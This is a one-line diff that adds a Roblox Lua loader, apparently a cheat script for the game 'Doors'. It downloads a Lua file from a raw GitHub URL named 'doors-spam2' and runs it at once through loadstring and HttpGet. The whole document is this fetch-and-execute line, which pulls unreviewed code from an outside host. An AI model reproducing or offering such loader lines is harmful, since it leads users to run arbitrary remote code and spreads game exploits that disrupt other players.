@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/doors-spam2-6bmb5q3jm9s6e0.lua"))()
